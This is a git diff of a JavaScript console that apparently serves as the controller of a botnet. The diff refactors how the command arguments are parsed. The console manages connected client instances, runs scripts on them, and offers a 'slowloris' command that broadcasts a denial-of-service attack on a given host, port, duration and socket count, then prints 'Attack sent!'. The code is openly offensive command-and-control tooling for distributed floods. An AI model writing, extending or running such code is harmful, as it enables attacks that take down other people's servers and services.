@@ -13,22 +13,29 @@ export function prompt() {
 		message = message.toLowerCase();
 
 		// Commands
+		const commandArgs = {
+			"firstArg": message.split(" ")[1],
+			"secondArg": message.split(" ")[2],
+			"thirdArg": message.split(" ")[3],
+			"fourthArg": message.split(" ")[4]
+		}
+
 		if (message.startsWith("instances")) {
 			if (message === "instances") {
 				console.log(
 					`Instances: ${clientModules.clientInstances.length}`
 				);
-			} else if (message.split(" ")[1] <= clientModules.clients.length) {
+			} else if (commandArgs.firstArg <= clientModules.clients.length) {
 				clientModules.clientInstances = [...clientModules.clients];
 				clientModules.clientInstances =
 					clientModules.clientInstances.slice(
 						0,
-						message.split(" ")[1]
+						commandArgs.firstArg
 					);
 			}
 		}
 
-		if (message.split(" ")[1] === "all")
+		if (commandArgs.firstArg === "all")
 			clientModules.clientInstances = [...clientModules.clients];
 
 		if (message.startsWith("help")) {
@@ -38,12 +45,12 @@ export function prompt() {
 					console.log(help[i].command);
 				}
 			} else if (
-				help.filter((i) => i.command === message.split(" ")[1]).length >
+				help.filter((i) => i.command === commandArgs.firstArg).length >
 				0
 			) {
 				let commandIndex = help
 					.map((i) => i.command)
-					.indexOf(message.split(" ")[1]);
+					.indexOf(commandArgs.firstArg);
 
 				console.log(
 					`Functionality: ${help[commandIndex].functionality}\nUsage: ${help[commandIndex].usage}`
@@ -54,7 +61,7 @@ export function prompt() {
 		if (message.startsWith("silent")) {
 			if (message === "silent")
 				console.log(`silent: ${clientModules.silent}`);
-			else if (message.split(" ")[1] === "true") {
+			else if (commandArgs.firstArg === "true") {
 				clientModules.silent = true;
 			} else {
 				clientModules.silent = false;
@@ -69,7 +76,7 @@ export function prompt() {
 		}
 
 		if (message.startsWith("run")) {
-			runScript(message.split(" ")[1]);
+			runScript(commandArgs.firstArg);
 		}
 
 		if (message.startsWith("slowloris")) {
@@ -77,14 +84,14 @@ export function prompt() {
 				console.log(
 					"Please provide arguments: slowloris (host) (port) (duration ms) (sockets)"
 				);
-			} else if (message.split(" ")[1] !== undefined) {
+			} else if (commandArgs.firstArg !== undefined) {
 				broadcast(message);
 				console.log(` Attack sent!`);
 			}
 
-			let duration = message.split(" ")[3];
+			let duration = commandArgs.thirdArg;
 
-			if (message.split(" ")[3] === undefined) {
+			if (commandArgs.thirdArg === undefined) {
 				duration = 60000;
 			}
 
